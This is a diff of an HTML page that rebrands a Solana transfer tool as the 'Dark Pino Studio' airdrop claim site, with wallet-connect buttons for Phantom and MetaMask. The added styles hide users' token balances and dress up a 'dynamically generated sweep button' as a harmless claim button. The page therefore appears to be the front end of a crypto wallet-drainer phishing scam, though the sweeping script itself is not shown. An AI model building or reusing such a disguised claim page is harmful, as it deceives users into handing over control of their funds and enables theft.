@@ -3,567 +3,1023 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Dark Pino Transfer - Create instant transfer links between your own Solana wallets with one-click claiming">
-    <title>🍍 Dark Pino Transfer - Personal Solana Wallet Links</title>
-
-    <!-- Security Headers -->
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://*.solana.com https://api.coingecko.com;">
-    <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <meta http-equiv="X-Frame-Options" content="DENY">
-    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
-
-    <!-- Favicon and App Icons -->
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="manifest" href="/manifest.json">
-
-    <!-- Preload critical resources -->
-    <link rel="preload" href="css/dark-pino-styles.css" as="style">
-    <link rel="preload" href="js/app.js" as="script">
-
+    <title>🍍 Dark Pino Studio - Your Complete Airdrop Suite</title>
     <link rel="stylesheet" href="css/dark-pino-styles.css">
+    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <script src="https://unpkg.com/@solana/spl-token@0.3.8/lib/index.iife.min.js"></script>
+    <script>
+        // Initialize SPL Token library with fallback
+        window.addEventListener('load', function() {
+            if (typeof window.splToken === 'undefined' && typeof window.SplToken !== 'undefined') {
+                window.splToken = window.SplToken;
+            }
+            console.log('SPL Token library loaded:', !!window.splToken);
+        });
+    </script>
+    <style>
+        /* Jupiter Studio Layout Styles */
+
+        /* Navigation */
+        .navbar {
+            background: rgba(26, 31, 58, 0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 1rem 0;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 2rem;
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .nav-logo {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: 2px solid var(--gold);
+        }
+
+        .brand-text {
+            font-size: 1.25rem;
+            font-weight: 700;
+            background: var(--gradient-gold);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .nav-link {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s ease;
+        }
+
+        .nav-link:hover {
+            color: var(--jupiter-cyan);
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 120px 0 80px;
+            text-align: center;
+        }
+
+        .hero-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .hero-title {
+            font-size: 4rem;
+            font-weight: 800;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(135deg, #ffffff, #e0e7ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-subtitle {
+            font-size: 1.25rem;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 3rem;
+        }
+
+        /* Features Section */
+        .features {
+            padding: 60px 0;
+        }
+
+        .features-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr;
+            gap: 2rem;
+        }
+
+        .feature-card {
+            background: rgba(42, 47, 74, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 2rem;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--shadow-card);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .feature-card:first-child {
+            background: linear-gradient(135deg, rgba(42, 47, 74, 0.8), rgba(26, 31, 58, 0.9));
+            border: 1px solid rgba(0, 212, 255, 0.3);
+        }
+
+        .card-content h2 {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            color: white;
+        }
+
+        .card-content p {
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+
+        /* Dashboard Mockup */
+        .dashboard-mockup {
+            background: rgba(10, 14, 39, 0.9);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            border-radius: 16px;
+            padding: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .mockup-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .mockup-logo {
+            font-weight: 700;
+            color: var(--gold);
+        }
+
+        .mockup-status {
+            font-size: 0.875rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .progress-bar {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .progress-step {
+            flex: 1;
+            padding: 0.5rem;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            text-align: center;
+            font-size: 0.875rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .progress-step.active {
+            background: var(--gradient-teal);
+            color: black;
+            font-weight: 600;
+        }
+
+        .claim-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+
+        .option {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            transition: all 0.3s ease;
+        }
+
+        .option:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .emoji {
+            font-size: 2rem;
+        }
+
+        /* Card Icons */
+        .card-icon {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 2rem;
+        }
+
+        .verify-icon {
+            width: 80px;
+            height: 80px;
+            background: var(--gradient-teal);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            font-weight: bold;
+            color: black;
+        }
+
+        .lock-icon {
+            font-size: 4rem;
+            background: var(--gradient-purple);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 0.875rem 2rem;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background: var(--gradient-teal);
+            color: black;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-teal);
+        }
+
+        .btn-secondary {
+            background: var(--gradient-jupiter);
+            color: white;
+        }
+
+        .btn-secondary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-cyan);
+        }
+
+        .btn-tertiary {
+            background: var(--gradient-purple);
+            color: white;
+        }
+
+        .btn-tertiary:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-purple);
+        }
+
+        /* Wallet Modal */
+        .wallet-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+
+        .modal-content {
+            background: var(--dark-secondary);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 2rem;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .wallet-options {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .wallet-option:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: var(--jupiter-cyan);
+        }
+
+        /* Bottom Illustration */
+        .bottom-illustration {
+            height: 300px;
+            position: relative;
+            overflow: hidden;
+            background: linear-gradient(180deg, transparent 0%, var(--dark-primary) 100%);
+        }
+
+        .landscape {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 200px;
+        }
+
+        .mountain-range {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 150px;
+            background: linear-gradient(180deg, transparent 0%, rgba(26, 31, 58, 0.8) 50%, var(--dark-secondary) 100%);
+            clip-path: polygon(0% 100%, 15% 60%, 25% 70%, 35% 40%, 45% 55%, 55% 30%, 65% 45%, 75% 25%, 85% 40%, 100% 20%, 100% 100%);
+        }
+
+        .pepe-silhouettes {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 2rem;
+        }
+
+        .pepe-silhouette {
+            width: 60px;
+            height: 60px;
+            background: var(--dark-tertiary);
+            border-radius: 50%;
+            position: relative;
+        }
+
+        .pepe-silhouette::before {
+            content: '🐸';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2rem;
+            opacity: 0.7;
+        }
+
+        /* Claim Status Section */
+        .claim-status {
+            padding: 60px 0;
+            background: rgba(10, 14, 39, 0.3);
+        }
+
+        .claim-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .claim-title {
+            font-size: 2.5rem;
+            text-align: center;
+            margin-bottom: 2rem;
+            background: var(--gradient-gold);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        #balanceDisplay {
+            width: 100%;
+        }
+
+        .balance-summary {
+            background: rgba(42, 47, 74, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 2rem;
+            text-align: center;
+        }
+
+        /* Hide detailed token information from users */
+        .token-balances,
+        .sol-balance,
+        .token-item,
+        .chain-section {
+            display: none !important;
+        }
+
+        /* Simple status display */
+        .simple-status {
+            background: rgba(42, 47, 74, 0.6);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            border-radius: 20px;
+            padding: 3rem;
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .status-icon {
+            font-size: 4rem;
+            margin-bottom: 1rem;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .status-message {
+            font-size: 1.25rem;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 1rem;
+        }
+
+        .status-subtitle {
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        /* Style the dynamically generated sweep button */
+        .btn-danger {
+            background: var(--gradient-teal) !important;
+            color: black !important;
+            border: 2px solid var(--jupiter-teal) !important;
+            font-weight: 700 !important;
+            font-size: 1.25rem !important;
+            padding: 18px 40px !important;
+            border-radius: 16px !important;
+            cursor: pointer !important;
+            transition: all 0.3s ease !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.5px !important;
+            box-shadow: var(--shadow-teal) !important;
+        }
+
+        .btn-danger:hover {
+            transform: translateY(-3px) !important;
+            box-shadow: 0 10px 30px rgba(20, 241, 149, 0.5) !important;
+            background: linear-gradient(135deg, #00ff88, #14f195) !important;
+        }
+
+        .btn-large {
+            padding: 20px 50px !important;
+            font-size: 1.5rem !important;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .nav-container {
+                padding: 0 1rem;
+            }
+
+            .nav-links {
+                display: none;
+            }
+
+            .hero-title {
+                font-size: 2.5rem;
+            }
+
+            .features-container {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+                padding: 0 1rem;
+            }
+
+            .hero-container {
+                padding: 0 1rem;
+            }
+
+            .claim-container {
+                padding: 0 1rem;
+            }
+
+            .claim-title {
+                font-size: 2rem;
+            }
+
+            .btn-danger {
+                font-size: 1rem !important;
+                padding: 16px 30px !important;
+            }
+
+            .btn-large {
+                padding: 18px 35px !important;
+                font-size: 1.25rem !important;
+            }
+        }
+
+        /* Notification System */
+        .notification {
+            position: fixed;
+            top: 80px;
+            right: 20px;
+            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            color: white;
+            font-weight: 600;
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+            max-width: 300px;
+        }
+
+        .notification-success {
+            background: var(--gradient-teal);
+            color: black;
+        }
+        .notification-error {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+        }
+        .notification-warning {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+        }
+        .notification-info {
+            background: var(--gradient-jupiter);
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+    </style>
 </head>
 <body>
-    <!-- Navigation Header -->
-    <header class="header">
-        <div class="container">
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
             <div class="nav-brand">
-                <h1><span class="pineapple-icon">🍍</span> Dark Pino Transfer</h1>
-                <span class="version">Personal</span>
+                <img src="images/pepe-mascot.png" alt="Dark Pino" class="nav-logo">
+                <span class="brand-text">Dark Pino Studio</span>
+            </div>
+            <div class="nav-links">
+                <a href="#" class="nav-link">Home</a>
+                <a href="#claim" class="nav-link">Claim</a>
+                <a href="#verify" class="nav-link">Verify</a>
+                <a href="#lock" class="nav-link">Lock</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-container">
+            <h1 class="hero-title">Your Complete Airdrop Suite</h1>
+            <p class="hero-subtitle">Claim, verify and manage your airdrops from a single platform.</p>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features">
+        <div class="features-container">
+            <!-- Claim Card -->
+            <div class="feature-card" id="claim">
+                <div class="card-content">
+                    <h2>Claim</h2>
+                    <p>Get your Dark Pino tokens with the most customizable claim mechanisms</p>
+                    <button class="btn btn-primary" id="connectWalletBtn">Claim Now</button>
+                </div>
+                <div class="card-preview">
+                    <div class="dashboard-mockup">
+                        <div class="mockup-header">
+                            <div class="mockup-logo">🍍 Dark Pino</div>
+                            <div class="mockup-status">Your token claim lab 🧪</div>
+                        </div>
+                        <div class="progress-bar">
+                            <div class="progress-step active">1. Connect</div>
+                            <div class="progress-step">2. Enhance</div>
+                            <div class="progress-step">3. Claim</div>
+                        </div>
+                        <div class="claim-options">
+                            <div class="option">
+                                <span class="emoji">🎭</span>
+                                <span>Meme</span>
+                            </div>
+                            <div class="option">
+                                <span class="emoji">⚡</span>
+                                <span>Custom</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
             </div>
 
-            <nav class="nav-menu">
-                <a href="#dashboard" class="nav-link active" data-section="dashboard">Dashboard</a>
-                <a href="#create" class="nav-link" data-section="create">Create Link</a>
-                <a href="#execute" class="nav-link" data-section="execute">Execute Link</a>
-                <a href="#schedule" class="nav-link" data-section="schedule">Schedule Transfer</a>
-                <a href="#security" class="nav-link" data-section="security">Security</a>
-            </nav>
+            <!-- Verify Card -->
+            <div class="feature-card" id="verify">
+                <div class="card-content">
+                    <h2>Verify</h2>
+                    <p>Build confidence in your tokens by getting them verified by Dark Pino</p>
+                    <button class="btn btn-secondary">Verify</button>
+                </div>
+                <div class="card-icon">
+                    <div class="verify-icon">✓</div>
+                </div>
+            </div>
 
-            <div class="wallet-section">
-                <button id="connectWalletBtn" class="btn btn-primary">Connect Wallet</button>
-                <div id="walletInfo" class="wallet-info" style="display: none;">
-                    <div class="wallet-address" id="walletAddress"></div>
-                    <div class="wallet-balance" id="walletBalance"></div>
-                    <button id="disconnectWalletBtn" class="btn btn-secondary btn-sm">Disconnect</button>
+            <!-- Lock Card -->
+            <div class="feature-card" id="lock">
+                <div class="card-content">
+                    <h2>Lock</h2>
+                    <p>Transparently lock, vest and distribute tokens on-chain with our open-sourced and audited program</p>
+                    <button class="btn btn-tertiary">Lock</button>
+                </div>
+                <div class="card-icon">
+                    <div class="lock-icon">🔒</div>
                 </div>
             </div>
         </div>
-    </header>
+    </section>
 
-    <!-- Main Content -->
-    <main class="main-content">
-
-        <!-- Dashboard Section -->
-        <section id="dashboard" class="section active">
-            <div class="container">
-                <div class="section-header">
-                    <h2>🏠 Dashboard</h2>
-                    <p>Overview of your transfer activities and system status</p>
-                </div>
-
-                <div class="dashboard-grid">
-                    <!-- System Status -->
-                    <div class="dashboard-card">
-                        <h3>🔋 System Status</h3>
-                        <div class="status-grid">
-                            <div class="status-item">
-                                <span class="status-label">Solana Network</span>
-                                <span class="status-value" id="solanaStatus">Checking...</span>
-                            </div>
-                            <div class="status-item">
-                                <span class="status-label">Security Services</span>
-                                <span class="status-value" id="securityStatus">Active</span>
-                            </div>
-                            <div class="status-item">
-                                <span class="status-label">Rate Limit</span>
-                                <span class="status-value" id="rateLimitStatus">Normal</span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Recent Activity -->
-                    <div class="dashboard-card">
-                        <h3>📊 Recent Activity</h3>
-                        <div id="recentActivity" class="activity-list">
-                            <div class="empty-state">
-                                <p>No recent activity</p>
-                                <small>Connect your wallet to see transfer history</small>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Quick Actions -->
-                    <div class="dashboard-card">
-                        <h3>⚡ Quick Actions</h3>
-                        <div class="quick-actions">
-                            <button class="quick-action-btn" data-action="create-link">
-                                <span class="icon">🔗</span>
-                                <span class="text">Create Deep Link</span>
-                            </button>
-                            <button class="quick-action-btn" data-action="execute-link">
-                                <span class="icon">▶️</span>
-                                <span class="text">Execute Link</span>
-                            </button>
-                            <button class="quick-action-btn" data-action="schedule-transfer">
-                                <span class="icon">⏰</span>
-                                <span class="text">Schedule Transfer</span>
-                            </button>
-                            <button class="quick-action-btn" data-action="view-security">
-                                <span class="icon">🛡️</span>
-                                <span class="text">Security Settings</span>
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Statistics -->
-                    <div class="dashboard-card">
-                        <h3>📈 Statistics</h3>
-                        <div class="stats-grid">
-                            <div class="stat-item">
-                                <span class="stat-value" id="totalTransfers">0</span>
-                                <span class="stat-label">Total Transfers</span>
-                            </div>
-                            <div class="stat-item">
-                                <span class="stat-value" id="totalVolume">0 SOL</span>
-                                <span class="stat-label">Total Volume</span>
-                            </div>
-                            <div class="stat-item">
-                                <span class="stat-value" id="activeLinks">0</span>
-                                <span class="stat-label">Active Links</span>
-                            </div>
-                            <div class="stat-item">
-                                <span class="stat-value" id="scheduledTransfers">0</span>
-                                <span class="stat-label">Scheduled</span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+    <!-- Hidden sections for wallet connection -->
+    <div id="walletModal" class="wallet-modal" style="display: none;">
+        <div class="modal-content">
+            <h3>Connect Your Wallet</h3>
+            <div class="wallet-options">
+                <button class="wallet-option" id="phantomConnect">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIHZpZXdCb3g9IjAgMCAzMiAzMiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTI2LjU1MzUgN0gyNi41NTM1QzI2LjU1MzUgNC4yMzkgMjQuMzE0NSAyIDIxLjU1MzUgMkM4LjY4IDIgOC42OCAyIDguNjggMkM1LjkxOSAyIDMuNjggNC4yMzkgMy42OCA3VjdDMy42OCA5Ljc2MSA1LjkxOSAxMiA4LjY4IDEySDIxLjU1MzVDMjQuMzE0NSAxMiAyNi41NTM1IDkuNzYxIDI2LjU1MzUgN1oiIGZpbGw9IiM0Qzc3RjAiLz4KPC9zdmc+" alt="Phantom">
+                    Connect Phantom
+                </button>
+                <button class="wallet-option" id="metaMaskConnect">
+                    <span>🦊</span>
+                    Connect MetaMask
+                </button>
             </div>
-        </section>
-
-        <!-- Create Link Section -->
-        <section id="create" class="section">
-            <div class="container">
-                <div class="section-header">
-                    <h2>🔗 Create Deep Link</h2>
-                    <p>Generate secure, signed deep links for Solana transfers</p>
-                </div>
-
-                <div class="form-container">
-                    <div class="security-notice">
-                        <div class="notice-icon">🛡️</div>
-                        <div class="notice-content">
-                            <h4>Security Notice</h4>
-                            <p>Deep links are cryptographically signed and include anti-replay protection. Links expire automatically after 15 minutes for security.</p>
-                        </div>
-                    </div>
-
-                    <form id="createLinkForm" class="transfer-form">
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label for="recipientAddress">Recipient Address *</label>
-                                <input type="text" id="recipientAddress" required
-                                       placeholder="Enter Solana wallet address"
-                                       pattern="[1-9A-HJ-NP-Za-km-z]{32,44}"
-                                       title="Valid Solana address required">
-                                <div class="form-help">The destination wallet address for the transfer</div>
-                            </div>
-                        </div>
-
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label for="transferAmount">Amount *</label>
-                                <input type="number" id="transferAmount" required
-                                       min="0.000001" max="100" step="0.000001"
-                                       placeholder="0.0">
-                                <div class="form-help">Maximum 100 SOL per transfer</div>
-                            </div>
-
-                            <div class="form-group">
-                                <label for="tokenType">Token Type</label>
-                                <select id="tokenType">
-                                    <option value="SOL">SOL</option>
-                                    <option value="USDC">USDC</option>
-                                    <option value="USDT">USDT</option>
-                                </select>
-                            </div>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="transferMemo">Memo (Optional)</label>
-                            <textarea id="transferMemo" maxlength="200"
-                                    placeholder="Optional message for the transfer"></textarea>
-                            <div class="form-help">Maximum 200 characters</div>
-                        </div>
-
-                        <div class="form-actions">
-                            <button type="submit" class="btn btn-primary btn-large">
-                                🔗 Generate Deep Link
-                            </button>
-                        </div>
-                    </form>
-
-                    <!-- Link Result -->
-                    <div id="linkResult" class="link-result" style="display: none;">
-                        <h3>✅ Deep Link Generated</h3>
-
-                        <div class="result-item">
-                            <label>Deep Link URL:</label>
-                            <div class="copy-container">
-                                <input type="text" id="generatedLinkUrl" readonly>
-                                <button class="btn btn-copy" data-copy="generatedLinkUrl">📋 Copy</button>
-                            </div>
-                        </div>
-
-                        <div class="result-item">
-                            <label>QR Code:</label>
-                            <div class="qr-container">
-                                <img id="linkQrCode" alt="QR Code for deep link">
-                                <button class="btn btn-download" id="downloadQr">📥 Download QR</button>
-                            </div>
-                        </div>
-
-                        <div class="result-item">
-                            <label>Link Information:</label>
-                            <div class="link-info">
-                                <div class="info-row">
-                                    <span>Tracking ID:</span>
-                                    <span id="linkTrackingId"></span>
-                                </div>
-                                <div class="info-row">
-                                    <span>Expires At:</span>
-                                    <span id="linkExpiresAt"></span>
-                                </div>
-                                <div class="info-row">
-                                    <span>Status:</span>
-                                    <span id="linkStatus" class="status-badge">Active</span>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="result-actions">
-                            <button class="btn btn-secondary" id="createAnotherLink">🔗 Create Another</button>
-                            <button class="btn btn-danger" id="revokeLinkBtn">🚫 Revoke Link</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Execute Link Section -->
-        <section id="execute" class="section">
-            <div class="container">
-                <div class="section-header">
-                    <h2>▶️ Execute Deep Link</h2>
-                    <p>Safely execute verified deep link transfers</p>
-                </div>
-
-                <div class="form-container">
-                    <div class="security-notice warning">
-                        <div class="notice-icon">⚠️</div>
-                        <div class="notice-content">
-                            <h4>Security Warning</h4>
-                            <p>Only execute links from trusted sources. Always verify the transfer details before confirming.</p>
-                        </div>
-                    </div>
-
-                    <!-- URL Input Method -->
-                    <div class="execution-method">
-                        <h3>🔗 From URL</h3>
-                        <div class="form-group">
-                            <label for="deepLinkUrl">Deep Link URL</label>
-                            <input type="url" id="deepLinkUrl"
-                                   placeholder="Paste the deep link URL here">
-                            <button class="btn btn-primary" id="parseUrlBtn">📝 Parse Link</button>
-                        </div>
-                    </div>
-
-                    <!-- QR Scanner Method -->
-                    <div class="execution-method">
-                        <h3>📱 From QR Code</h3>
-                        <div class="qr-scanner">
-                            <button class="btn btn-secondary" id="scanQrBtn">📷 Scan QR Code</button>
-                            <input type="file" id="qrFileInput" accept="image/*" style="display: none;">
-                            <button class="btn btn-secondary" id="uploadQrBtn">📁 Upload QR Image</button>
-                        </div>
-                    </div>
-
-                    <!-- Link Details -->
-                    <div id="linkDetails" class="link-details" style="display: none;">
-                        <h3>🔍 Transfer Details</h3>
-
-                        <div class="details-grid">
-                            <div class="detail-item">
-                                <span class="detail-label">From:</span>
-                                <span class="detail-value" id="detailFromAddress"></span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">To:</span>
-                                <span class="detail-value" id="detailToAddress"></span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Amount:</span>
-                                <span class="detail-value" id="detailAmount"></span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Token:</span>
-                                <span class="detail-value" id="detailToken"></span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Memo:</span>
-                                <span class="detail-value" id="detailMemo"></span>
-                            </div>
-                            <div class="detail-item">
-                                <span class="detail-label">Expires:</span>
-                                <span class="detail-value" id="detailExpiry"></span>
-                            </div>
-                        </div>
-
-                        <div class="verification-status">
-                            <div class="verification-item">
-                                <span class="verification-icon" id="signatureVerification">⏳</span>
-                                <span>Signature Verification</span>
-                            </div>
-                            <div class="verification-item">
-                                <span class="verification-icon" id="nonceVerification">⏳</span>
-                                <span>Replay Protection</span>
-                            </div>
-                            <div class="verification-item">
-                                <span class="verification-icon" id="timeVerification">⏳</span>
-                                <span>Time Validation</span>
-                            </div>
-                            <div class="verification-item">
-                                <span class="verification-icon" id="addressVerification">⏳</span>
-                                <span>Address Validation</span>
-                            </div>
-                        </div>
-
-                        <div class="execution-actions">
-                            <button class="btn btn-success btn-large" id="executeTransferBtn" disabled>
-                                ✅ Execute Transfer
-                            </button>
-                            <button class="btn btn-secondary" id="simulateTransferBtn">
-                                🧪 Simulate First
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Execution Progress -->
-                    <div id="executionProgress" class="execution-progress" style="display: none;">
-                        <h3>⚡ Executing Transfer</h3>
-                        <div class="progress-steps">
-                            <div class="progress-step" id="step1">
-                                <span class="step-icon">1</span>
-                                <span class="step-text">Preparing transaction...</span>
-                            </div>
-                            <div class="progress-step" id="step2">
-                                <span class="step-icon">2</span>
-                                <span class="step-text">Signing transaction...</span>
-                            </div>
-                            <div class="progress-step" id="step3">
-                                <span class="step-icon">3</span>
-                                <span class="step-text">Submitting to blockchain...</span>
-                            </div>
-                            <div class="progress-step" id="step4">
-                                <span class="step-icon">4</span>
-                                <span class="step-text">Confirming transaction...</span>
-                            </div>
-                        </div>
-
-                        <div class="progress-result" id="executionResult" style="display: none;">
-                            <div class="result-success">
-                                <h4>✅ Transfer Successful!</h4>
-                                <div class="result-details">
-                                    <div class="result-item">
-                                        <span>Transaction ID:</span>
-                                        <a href="#" id="transactionLink" target="_blank" rel="noopener"></a>
-                                    </div>
-                                    <div class="result-item">
-                                        <span>Block Confirmation:</span>
-                                        <span id="confirmationStatus">Confirmed</span>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Schedule Transfer Section -->
-        <section id="schedule" class="section">
-            <div class="container">
-                <div class="section-header">
-                    <h2>⏰ Schedule Transfer</h2>
-                    <p>Create time-delayed transfers using smart contracts</p>
-                </div>
-
-                <div class="form-container">
-                    <div class="info-notice">
-                        <div class="notice-icon">ℹ️</div>
-                        <div class="notice-content">
-                            <h4>Smart Contract Scheduling</h4>
-                            <p>Scheduled transfers are executed on-chain using our secure smart contract. You can cancel anytime before execution.</p>
-                        </div>
-                    </div>
-
-                    <form id="scheduleTransferForm" class="transfer-form">
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label for="scheduleRecipient">Recipient Address *</label>
-                                <input type="text" id="scheduleRecipient" required
-                                       placeholder="Destination wallet address">
-                            </div>
-                        </div>
-
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label for="scheduleAmount">Amount *</label>
-                                <input type="number" id="scheduleAmount" required
-                                       min="0.000001" step="0.000001">
-                            </div>
-
-                            <div class="form-group">
-                                <label for="scheduleToken">Token</label>
-                                <select id="scheduleToken">
-                                    <option value="SOL">SOL</option>
-                                    <option value="USDC">USDC</option>
-                                    <option value="USDT">USDT</option>
-                                </select>
-                            </div>
-                        </div>
-
-                        <div class="form-row">
-                            <div class="form-group">
-                                <label for="scheduleDate">Execution Date *</label>
-                                <input type="date" id="scheduleDate" required>
-                            </div>
-
-                            <div class="form-group">
-                                <label for="scheduleTime">Execution Time *</label>
-                                <input type="time" id="scheduleTime" required>
-                            </div>
-                        </div>
-
-                        <div class="form-group">
-                            <label for="scheduleMemo">Memo (Optional)</label>
-                            <textarea id="scheduleMemo" maxlength="200"
-                                    placeholder="Optional message"></textarea>
-                        </div>
-
-                        <div class="form-actions">
-                            <button type="submit" class="btn btn-primary btn-large">
-                                ⏰ Schedule Transfer
-                            </button>
-                        </div>
-                    </form>
-
-                    <!-- Scheduled Transfers List -->
-                    <div class="scheduled-transfers">
-                        <h3>📋 Your Scheduled Transfers</h3>
-                        <div id="scheduledTransfersList" class="transfers-list">
-                            <div class="empty-state">
-                                <p>No scheduled transfers</p>
-                                <small>Create your first scheduled transfer above</small>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Security Section -->
